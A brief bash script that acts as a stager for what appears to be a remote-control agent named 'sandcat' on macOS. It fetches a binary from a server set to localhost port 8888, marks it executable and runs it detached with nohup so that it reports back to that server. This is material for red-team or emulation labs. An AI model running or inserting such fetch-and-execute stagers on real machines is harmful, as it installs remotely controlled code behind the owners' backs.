#!/bin/bash
server="http://127.0.0.1:8888"
agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null
nohup ./$agent -server $server &
